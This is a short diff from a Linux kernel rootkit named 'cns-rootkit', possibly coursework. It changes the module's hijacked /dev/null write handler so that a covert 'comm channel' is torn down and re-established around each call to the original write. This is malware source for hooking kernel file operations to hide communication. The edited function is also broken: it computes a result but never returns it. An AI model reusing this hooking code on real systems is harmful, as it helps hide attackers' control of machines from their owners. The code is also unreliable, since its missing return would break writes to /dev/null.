@@ -24,7 +24,9 @@ ssize_t (*original_dev_null_write) (struct file *, char __user *, size_t, loff_t
 
 ssize_t cns_rootkit_dev_null_write(struct file *filep, char __user *buf, size_t count, loff_t *p) {
   printk(KERN_INFO "cns-rootkit: In my /dev/null write\n");
-  return original_dev_null_write(filep, buf, count, p);
+  unestablish_comm_channel();
+  ssize_t res =  original_dev_null_write(filep, buf, count, p);
+  establish_comm_channel();
 }
 
 int establish_comm_channel(void) {
